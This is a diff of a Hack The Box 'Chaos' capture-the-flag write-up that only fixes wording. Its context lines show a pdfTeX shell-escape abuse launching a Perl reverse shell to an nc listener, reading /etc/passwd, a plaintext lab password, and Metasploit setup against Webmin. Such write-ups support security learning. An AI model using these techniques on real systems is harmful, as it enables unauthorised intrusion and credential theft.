@@ -360,7 +360,7 @@ Okay! So under one layer of encryption and one layer of encoding we finally get 
 
 Some type of pdf making service... Okay. Let's put a shell command in the text field, pick one of the three templates (template 2 and 3 work, 1 doesn't), and test it out. Before we do that though, we can start burpsuite to proxy all of our web requests. One of the many things burp allows us to do is edit and manipulate fields before the request is sent to the server. This makes it easy to send whatever data we want to this service.
 
-Once I hit Create PDF button, burp intercepts my request. Since I don't want to modify anything, I allow it through and we see the server's response in burp:
+Once I hit the "Create PDF" button, burp intercepts my request. Since I don't want to modify anything, I allow it through and we see the server's response in burp:
 
 ```text
 HTTP/1.1 200 OK
@@ -422,7 +422,7 @@ Output written on 8e86b4170fe5983e267238d26390bb7a.pdf (1 page, 11808 bytes).
 Transcript written on 8e86b4170fe5983e267238d26390bb7a.log.
 ```
 
-Note, the pdf making website we're using isn't setup to display the server's response, so it never gave me this output. Since burp is intercepting our requests, it was able to see and log it for us. Anyway, we see some interesting things. We see what looks to be our PDF file being created and stored on the server. The first thing I try is to download our created pdf, but the server isn't actually serving the PDF for downloading.
+Note, the pdf making website we're using isn't set up to display the server's response, so it never gave me this output. Since burp is intercepting our requests, it was able to see and log it for us. Anyway, we see some interesting things. We see what looks to be our PDF file being created and stored on the server. The first thing I try is to download our created pdf, but the server isn't actually serving the PDF for downloading.
 
  We then see "pdfTeX" with a version number. After finding no exploits pertaining to that version of pdfTeX, I had to look up what pdfTeX was in the first place. I learned among other things it was in fact a pdf creating tool. I tried to throw various commands in, tested all the templates and came up short. I then saw this interesting line from the log:
 
@@ -431,7 +431,7 @@ Note, the pdf making website we're using isn't setup to display the server's res
   ```
 
 ## Exploitation
-I started to search around for that mode and what it does. Turns out it allows pdfTeX to execute shell commands. That sounds useful for an attacker... So, if it'll run commands for me, let's have it run a reverse shell that will connect back to my listener. First, I setup my listener on my local machine:
+I started to search around for that mode and what it does. Turns out it allows pdfTeX to execute shell commands. That sounds useful for an attacker... So, if it'll run commands for me, let's have it run a reverse shell that will connect back to my listener. First, I set up my listener on my local machine:
 
 ```text
 ~/ctf/htb/chaos λ nc -l -n -v -p 9002
@@ -445,7 +445,7 @@ getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"
 open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
 ```
 
-Once I hit the Create PDF button, it works. I now have a shell on the machine:
+Once I hit the "Create PDF" button, it works. I now have a shell on the machine:
 
 ```text
 ~/ctf/htb/chaos λ nc -l -n -v -p 9002
@@ -465,7 +465,7 @@ $ echo $0
 ```
 
 ## Privilege Escalation
-Once we have a shell we do basic linux enumeration to look for ways to escalate our privileges. One of the many commands is to view /etc/passwd to view the users of the machine:
+Once we have a shell we do basic linux enumeration to look for ways to escalate our privileges. A good place to start is with the /etc/passwd file to view the users of the machine:
 
 ```text
 $ cat /etc/passwd |grep ayush
@@ -561,7 +561,7 @@ Password: 'Thiv8wrej~'
 ```
 
 ## Exploitation: 2
-One step closer. We go back to webmin and login to ensure the credentials work, they do. Now we have an authenticated session to the webmin service, which is all we need for the exploit we first found to work. The exploit is built for the metasploit framework, so let's start that up and setup the exploit:
+One step closer. We go back to webmin and login to ensure the credentials work; they do. Now we have an authenticated session to the webmin service, which is all we need for the exploit we first found to work. The exploit is built for the metasploit framework, so let's start that up and set up the exploit:
 
 ```text
 ~/ctf/htb/chaos λ msfconsole
